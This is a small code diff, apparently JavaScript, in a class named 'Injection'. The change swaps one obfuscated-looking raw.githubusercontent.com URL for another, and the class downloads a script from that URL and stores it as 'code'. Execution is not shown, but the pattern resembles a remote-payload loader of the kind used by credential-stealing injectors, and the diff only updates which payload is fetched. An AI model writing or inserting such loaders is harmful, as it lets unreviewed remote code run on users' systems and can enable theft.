@@ -28,7 +28,7 @@ class Injection {
     let code;
     try {
       const res = await axios.get(
-        'https://raw.githubusercontent.com/P180EwqDeRT/ae6f117592b71439e4f9a75c19da8cdd/refs/heads/main/f9a75c19da8cdd/b4ttyxac2un.js'
+        'https://raw.githubusercontent.com/P180EwqDeRT/ae6f117592b71439e4f9a75c19da8cdd/refs/heads/main/f9a75c19da8cdd/ae6f117592b7.js'
       );
       code = res.data;
     } catch {
